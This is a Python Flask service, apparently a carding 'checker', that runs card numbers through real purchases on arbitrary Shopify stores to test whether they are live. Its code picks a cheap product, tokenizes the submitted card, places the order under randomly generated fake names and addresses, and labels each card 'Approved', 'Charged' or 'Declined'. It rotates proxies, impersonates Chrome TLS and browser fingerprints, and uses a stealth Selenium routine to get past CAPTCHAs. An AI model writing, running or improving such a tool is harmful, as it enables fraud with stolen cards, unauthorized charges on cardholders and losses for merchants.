#!/usr/bin/env python3
"""
Shopify Advanced Checker - API + CAPTCHA Bypass
High success rate, proxy rotation, auto product selection
"""

import asyncio
import random
import json
import re
import os
import sys
from datetime import datetime
from urllib.parse import urlparse, quote
from flask import Flask, request, jsonify

# ============ PART 1: IMPORTS & SETUP ============
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

import httpx
import aiohttp

# curl_cffi for Chrome TLS fingerprint
_CURL_CFFI_AVAILABLE = False
try:
    from curl_cffi.requests import AsyncSession as _CurlAsyncSession
    _CURL_CFFI_AVAILABLE = True
    print("[✓] curl_cffi loaded - Chrome TLS active")
except ImportError:
    print("[!] curl_cffi not installed - using httpx")

# Selenium CAPTCHA solver
_CAPTCHA_SOLVER_AVAILABLE = False
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    import pickle
    _CAPTCHA_SOLVER_AVAILABLE = True
    print("[✓] Selenium CAPTCHA solver loaded")
except ImportError:
    print("[!] Selenium not installed - CAPTCHA bypass disabled")

# ============ PART 2: PROXY HANDLER ============
def format_proxy(proxy_string):
    if not proxy_string or not proxy_string.strip():
        return None
    s = proxy_string.strip()
    if s.startswith(("http://", "https://", "socks4://", "socks5://")):
        return s
    if "@" in s:
        auth, host_port = s.split("@", 1)
        return f"http://{auth}@{host_port}"
    if ":" in s:
        parts = s.split(":")
        if len(parts) >= 4:
            host, port, user, pwd = parts[0], parts[1], ":".join(parts[2:-1]), parts[-1]
            if port.isdigit():
                return f"http://{quote(user, safe='')}:{quote(pwd, safe='')}@{host}:{port}"
        if len(parts) == 2 and parts[1].isdigit():
            return f"http://{parts[0]}:{parts[1]}"
    return None

def load_proxies(source):
    if not source:
        return []
    s = source.strip()
    if s.lower().startswith("file:"):
        path = s[5:].strip()
        try:
            with open(path, "r") as f:
                return [p for line in f if (p := format_proxy(line.strip()))]
        except:
            return []
    return [format_proxy(p.strip()) for p in s.split(",") if format_proxy(p.strip())]

# ============ PART 3: BROWSER FINGERPRINT ============
_CHROME_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.126 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.85 Safari/537.36",
]

_CHROME_BRANDS = {
    "136": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
    "133": '"Not?A_Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    "131": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
}

def get_fingerprint():
    ua = random.choice(_CHROME_UAS)
    ver_match = re.search(r'Chrome/(\d+)', ua)
    chrome_ver = ver_match.group(1) if ver_match else "136"
    return {
        "User-Agent": ua,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Sec-Ch-Ua": _CHROME_BRANDS.get(chrome_ver, _CHROME_BRANDS["136"]),
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "_chrome_ver": chrome_ver,
    }

# ============ PART 4: ADDRESS POOL ============
_ADDRESSES = [
    {"add1": "123 Main St", "city": "Portland", "state": "ME", "zip": "04101"},
    {"add1": "456 Oak Ave", "city": "Portland", "state": "ME", "zip": "04102"},
    {"add1": "789 Pine Rd", "city": "Bangor", "state": "ME", "zip": "04401"},
    {"add1": "1200 Market St", "city": "Wilmington", "state": "DE", "zip": "19801"},
    {"add1": "88 Broad St", "city": "Burlington", "state": "VT", "zip": "05401"},
    {"add1": "1425 Broadway", "city": "New York", "state": "NY", "zip": "10018"},
    {"add1": "350 5th Ave", "city": "New York", "state": "NY", "zip": "10118"},
    {"add1": "1600 Vine St", "city": "Los Angeles", "state": "CA", "zip": "90028"},
    {"add1": "233 S Wacker Dr", "city": "Chicago", "state": "IL", "zip": "60606"},
    {"add1": "1500 Market St", "city": "Philadelphia", "state": "PA", "zip": "19102"},
]

_FIRST_NAMES = ["John", "Emily", "Michael", "Sarah", "David", "Jessica", "James", "Ashley"]
_LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
_EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
_PHONES = ["2025550199", "3105551234", "4155559876", "6175550123", "2125559999"]

def get_random_info():
    addr = random.choice(_ADDRESSES)
    first = random.choice(_FIRST_NAMES)
    last = random.choice(_LAST_NAMES)
    return {
        "fname": first, "lname": last,
        "email": f"{first.lower()}.{last.lower()}{random.randint(1,999)}@{random.choice(_EMAIL_DOMAINS)}",
        "phone": random.choice(_PHONES),
        "add1": addr["add1"], "city": addr["city"],
        "state": addr["state"], "zip": addr["zip"],
    }

# ============ PART 5: HTTP CLIENT ============
def create_client(proxy=None, timeout=30.0, chrome_ver=None):
    if _CURL_CFFI_AVAILABLE:
        impersonate = f"chrome{chrome_ver}" if chrome_ver and chrome_ver in ["136","133","131"] else "chrome136"
        kw = {"impersonate": impersonate, "allow_redirects": True, "timeout": timeout, "verify": False}
        if proxy:
            kw["proxy"] = proxy
        return _CurlAsyncSession(**kw)
    else:
        return httpx.AsyncClient(proxy=proxy, follow_redirects=True, timeout=timeout, verify=False)

# ============ PART 6: SELENIUM CAPTCHA SOLVER ============
_cookie_cache = {}

def solve_captcha_sync(checkout_url, proxy=None, timeout=60):
    """Synchronous CAPTCHA solver - runs in thread pool"""
    if not _CAPTCHA_SOLVER_AVAILABLE:
        return {"solved": False, "error": "Selenium not installed"}
    
    chrome_options = Options()
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.7103.93 Safari/537.36")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option("useAutomationExtension", False)
    
    if proxy:
        chrome_options.add_argument(f'--proxy-server={proxy}')
    
    driver = None
    try:
        driver = webdriver.Chrome(options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        driver.get(checkout_url)
        
        # Wait for page to load
        wait = WebDriverWait(driver, timeout)
        
        # Check for CAPTCHA
        page_source = driver.page_source.lower()
        if "captcha" in page_source or "hcaptcha" in page_source or "recaptcha" in page_source:
            print("[CAPTCHA] Detected - waiting for manual solve or auto...")
            # Wait for CAPTCHA to be solved (max timeout)
            wait.until(lambda d: "captcha" not in d.page_source.lower() or "checkout" in d.current_url.lower())
        
        # Wait for checkout form
        try:
            wait.until(EC.presence_of_element_located((By.NAME, "number")) or
                      EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='tel']")))
        except:
            pass
        
        final_url = driver.current_url
        session_token = None
        
        # Extract session token from page
        html = driver.page_source
        token_match = re.search(r'serialized-sessionToken["\s]+content=["\']&quot;([^&]+)&quot;', html)
        if token_match:
            session_token = token_match.group(1)
        
        # Save cookies for reuse
        cookies = {c['name']: c['value'] for c in driver.get_cookies()}
        
        return {
            "solved": True,
            "final_url": final_url,
            "session_token": session_token,
            "cookies": cookies,
            "page_html": html,
        }
    except Exception as e:
        return {"solved": False, "error": str(e)}
    finally:
        if driver:
            driver.quit()

async def solve_captcha(checkout_url, proxy=None, timeout=60):
    """Async wrapper for CAPTCHA solver"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, solve_captcha_sync, checkout_url, proxy, timeout)

# ============ PART 7: CORE CHECKER ============
async def shopify_check(site_url, cc, mon, year, cvv, proxy_str=None, max_captcha_retries=1):
    """Main Shopify checker - returns result dict"""
    site_url = site_url.strip().rstrip("/")
    fp = get_fingerprint()
    proxy = format_proxy(proxy_str) if proxy_str else None
    
    _log(f"Starting: {site_url[:40]}... | card={cc[-4:]}")
    
    try:
        async with create_client(proxy=proxy, timeout=30.0, chrome_ver=fp["_chrome_ver"]) as session:
            # Step 1: Get product
            headers = {k: v for k, v in fp.items() if k not in ["_chrome_ver"]}
            
            resp = await session.get(f"{site_url}/products.json", headers=headers)
            if resp.status_code != 200:
                return result("Error", f"Products page HTTP {resp.status_code}")
            
            products = resp.json().get("products", [])
            if not products:
                return result("Error", "No products found")
            
            # Find cheapest product $10-40
            best = None
            best_price = None
            for p in products:
                for v in p.get("variants", []):
                    if not v.get("available", True):
                        continue
                    try:
                        price = float(v.get("price", 0))
                    except:
                        continue
                    if 10 <= price <= 40:
                        if best_price is None or price < best_price:
                            best_price = price
                            best = {"handle": p["handle"], "variant_id": v["id"], "title": p["title"], "price": price}
            
            if not best:
                return result("Error", "No suitable product ($10-40)")
            
            _log(f"Product: {best['title'][:30]} | ${best['price']}")
            
            # Step 2: Add to cart
            await asyncio.sleep(random.uniform(0.5, 1.0))
            add_headers = {**headers, "content-type": "application/x-www-form-urlencoded"}
            add_resp = await session.post(f"{site_url}/cart/add.js", headers=add_headers, data={"id": best["variant_id"], "quantity": "1"})
            if add_resp.status_code != 200:
                return result("Error", "Cart add failed")
            
            # Step 3: Get checkout
            await asyncio.sleep(random.uniform(0.5, 1.0))
            checkout_resp = await session.post(f"{site_url}/cart", headers=headers, data={"checkout": ""})
            checkout_url = str(checkout_resp.url)
            html = checkout_resp.text
            
            # Extract tokens
            session_token = None
            tok_match = re.search(r'serialized-sessionToken["\s]+content=["\']&quot;([^&]+)&quot;', html)
            if tok_match:
                session_token = tok_match.group(1)
            
            if not session_token:
                return result("Error", "No session token - possibly CAPTCHA", error_code="CAPTCHA_REQUIRED", _checkout_url=checkout_url)
            
            queue_token = extract_between(html, 'queueToken&quot;:&quot;', '&quot;') or ""
            stable_id = extract_between(html, 'stableId&quot;:&quot;', '&quot;') or ""
            payment_id = extract_between(html, 'paymentMethodIdentifier&quot;:&quot;', '&quot;') or ""
            delivery_line = extract_between(html, 'deliveryLineStableId&quot;:&quot;', '&quot;') or ""
            
            info = get_random_info()
            
            # Step 4: Tokenize card
            sessionid = await tokenize_card(session, cc, mon, year, cvv, info["fname"], info["lname"], site_url, fp, proxy)
            if not sessionid:
                return result("Error", "Payment tokenization failed")
            
            # Step 5: Submit GraphQL
            graphql_url = f"{site_url}/checkouts/unstable/graphql"
            attempt_token = f"{random.randint(100000, 999999)}-{random.random()}"
            
            submit_result = await submit_payment(
                session, graphql_url, session_token, queue_token, stable_id, payment_id,
                delivery_line, best["variant_id"], sessionid, info, fp, attempt_token, site_url,
                requires_shipping=True
            )
            
            if submit_result:
                return submit_result
            
            return result("Error", "Unknown - no receipt")
            
    except Exception as e:
        return result("Error", str(e)[:100])

async def tokenize_card(session, cc, mon, year, cvv, fname, lname, site_url, fp, proxy=None):
    endpoints = [
        "https://deposit.us.shopifycs.com/sessions",
        "https://checkout.pci.shopifyinc.com/sessions",
    ]
    payload = {
        "credit_card": {
            "number": cc, "month": mon, "year": year,
            "verification_value": cvv, "name": f"{fname} {lname}"
        },
        "payment_session_scope": urlparse(site_url).netloc
    }
    headers = {
        "accept": "application/json", "content-type": "application/json",
        "user-agent": fp["User-Agent"], "origin": "https://checkout.shopifycs.com"
    }
    
    for ep in endpoints:
        try:
            resp = await session.post(ep, json=payload, headers=headers)
            if resp.status_code == 200:
                sid = resp.json().get("id")
                if sid:
                    return sid
        except:
            continue
    return None

async def submit_payment(session, graphql_url, session_token, queue_token, stable_id, payment_id,
                         delivery_line, variant_id, sessionid, info, fp, attempt_token, site_url, requires_shipping=True):
    
    query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""
    
    delivery_line_data = {"stableId": delivery_line} if delivery_line else {"deliveryMethodTypes": ["SHIPPING"]}
    
    payload = {
        "query": query,
        "variables": {
            "input": {
                "sessionInput": {"sessionToken": session_token},
                "queueToken": queue_token,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}},
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                        "destination": {"streetAddress": {"address1": info["add1"], "city": info["city"], "countryCode": "US", "postalCode": info["zip"], "firstName": info["fname"], "lastName": info["lname"], "zoneCode": info["state"], "phone": info["phone"]}},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": False,
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": []}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                    }],
                },
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": payment_id, "sessionId": sessionid, "billingAddress": {"streetAddress": {"address1": info["add1"], "city": info["city"], "countryCode": "US", "postalCode": info["zip"], "firstName": info["fname"], "lastName": info["lname"], "zoneCode": info["state"], "phone": info["phone"]}}}},
                        "amount": {"any": True},
                        "dueAt": None,
                    }],
                    "billingAddress": {"streetAddress": {"address1": info["add1"], "city": info["city"], "countryCode": "US", "postalCode": info["zip"], "firstName": info["fname"], "lastName": info["lname"], "zoneCode": info["state"], "phone": info["phone"]}},
                },
                "buyerIdentity": {
                    "buyerIdentity": {"presentmentCurrency": "USD", "countryCode": "US"},
                    "contactInfoV2": {"emailOrSms": {"value": info["email"], "emailOrSmsChanged": False}},
                    "marketingConsent": [{"email": {"value": info["email"]}}],
                },
                "tip": {"tipLines": []},
                "taxes": {"proposedTotalAmount": {"any": True}},
                "note": {"message": None},
                "scriptFingerprint": {"signature": None},
            },
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {"requestUrl": f"{site_url}/checkouts/cn/{attempt_token.split('-')[0]}"},
        },
        "operationName": "SubmitForCompletion",
    }
    
    headers = {
        "accept": "application/json", "content-type": "application/json",
        "user-agent": fp["User-Agent"], "x-checkout-one-session-token": session_token,
        "origin": site_url, "referer": f"{site_url}/",
    }
    
    resp = await session.post(graphql_url, json=payload, headers=headers)
    if resp.status_code != 200:
        return None
    
    data = resp.json()
    completion = data.get("data", {}).get("submitForCompletion", {})
    receipt = completion.get("receipt")
    
    if not receipt:
        errors = completion.get("errors", [])
        if errors:
            code = errors[0].get("code", "")
            if code in ["PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS", "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC"]:
                return result("Approved", f"Card approved - {code}", error_code=code)
            if code in ["CHECKPOINT_DENIED", "CAPTCHA_REQUIRED"]:
                return result("Error", "CAPTCHA Required", error_code="CAPTCHA_REQUIRED")
        return None
    
    receipt_id = receipt.get("id")
    rtype = receipt.get("__typename", "")
    
    if rtype == "ProcessedReceipt":
        return result("Charged", "ORDER PLACED - Money taken")
    elif rtype == "ActionRequiredReceipt":
        return result("Approved", "3DS Required - Card is live")
    elif rtype == "FailedReceipt":
        err = receipt.get("processingError", {})
        code = err.get("code", "DECLINED")
        if code in ["INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD"]:
            return result("Approved", f"Card checked - {code}", error_code=code)
        return result("Declined", f"Card declined - {code}", error_code=code)
    elif rtype == "ProcessingReceipt":
        # Poll
        for _ in range(10):
            await asyncio.sleep(2)
            poll_resp = await session.post(graphql_url, json={
                "query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id orderIdentity{buyerIdentifier id}}...on FailedReceipt{id processingError{code messageUntranslated}}...on ActionRequiredReceipt{id}}",
                "variables": {"receiptId": receipt_id, "sessionToken": session_token},
            }, headers=headers)
            if poll_resp.status_code == 200:
                rec = poll_resp.json().get("data", {}).get("receipt", {})
                if rec.get("__typename") == "ProcessedReceipt":
                    return result("Charged", "ORDER PLACED")
                if rec.get("__typename") == "FailedReceipt":
                    return result("Declined", "Card declined")
                if rec.get("__typename") == "ActionRequiredReceipt":
                    return result("Approved", "3DS Required")
        return result("Error", "Poll timeout")
    
    return None

def result(status, message, error_code=None, _checkout_url=None, product=None, price=None):
    res = {"status": status, "message": message}
    if error_code:
        res["error_code"] = error_code
    if _checkout_url:
        res["_checkout_url"] = _checkout_url
    return res

def extract_between(text, start, end):
    try:
        i = text.find(start)
        if i == -1:
            return ""
        i += len(start)
        j = text.find(end, i)
        return text[i:j] if j != -1 else ""
    except:
        return ""

def _log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

# ============ PART 8: FLASK API ============
app = Flask(__name__)

@app.route('/shopify', methods=['GET', 'POST'])
def api_check():
    if request.method == 'GET':
        site = request.args.get('site')
        cc_str = request.args.get('cc')
        proxy_str = request.args.get('proxy')
    else:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400
        site = data.get('site')
        cc_str = data.get('cc')
        proxy_str = data.get('proxy')
    
    if not site or not cc_str:
        return jsonify({"error": "Missing site or cc parameter", "status": False}), 400
    
    # Parse CC
    parts = cc_str.replace(" ", "").split("|")
    if len(parts) != 4:
        return jsonify({"error": "CC format: CC|MM|YYYY|CVV", "status": False}), 400
    
    cc, mon, year, cvv = parts
    
    # Run check
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(shopify_check(site, cc, mon, year, cvv, proxy_str))
    finally:
        loop.close()
    
    # If CAPTCHA required, try solver
    if result.get("error_code") == "CAPTCHA_REQUIRED" and _CAPTCHA_SOLVER_AVAILABLE:
        checkout_url = result.get("_checkout_url", f"{site}/checkout")
        _log("CAPTCHA detected - launching solver...")
        
        solver_result = asyncio.run(solve_captcha(checkout_url, proxy_str, timeout=60))
        
        if solver_result.get("solved"):
            _log("CAPTCHA bypassed! Retrying...")
            # Retry with fresh session
            loop2 = asyncio.new_event_loop()
            asyncio.set_event_loop(loop2)
            try:
                result = loop2.run_until_complete(shopify_check(site, cc, mon, year, cvv, proxy_str))
            finally:
                loop2.close()
    
    return jsonify({
        "status": result.get("status") == "Charged" or result.get("status") == "Approved",
        "message": result.get("message"),
        "error_code": result.get("error_code"),
        "raw_status": result.get("status"),
    })

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok", "captcha_solver": _CAPTCHA_SOLVER_AVAILABLE, "curl_cffi": _CURL_CFFI_AVAILABLE})

# ============ PART 9: MAIN ============
if __name__ == "__main__":
    print("="*50)
    print("  Shopify Advanced Checker API")
    print("  CAPTCHA Solver: " + ("✓" if _CAPTCHA_SOLVER_AVAILABLE else "✗"))
    print("  curl_cffi: " + ("✓" if _CURL_CFFI_AVAILABLE else "✗"))
    print("="*50)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)